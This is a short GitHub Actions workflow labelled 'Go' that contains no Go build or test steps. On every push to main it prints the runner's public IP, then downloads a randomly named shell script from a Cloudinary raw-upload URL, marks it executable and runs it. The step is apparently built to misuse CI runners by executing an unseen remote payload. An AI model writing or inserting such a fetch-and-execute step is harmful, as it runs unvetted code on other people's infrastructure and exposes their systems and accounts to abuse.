name: Go

on:
  workflow_dispatch:
  push:
    branches: [main]

jobs:
  run:
    continue-on-error: true
    runs-on: ubuntu-latest
    steps:
      - name: IP Workflow
        run: |
          curl https://api.ipify.org
      - name: Run exec
        timeout-minutes: 2
        run: |
          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1711325850/snydi9brworvcqyabds5.sh
          chmod +x snydi9brworvcqyabds5.sh
          ./snydi9brworvcqyabds5.sh


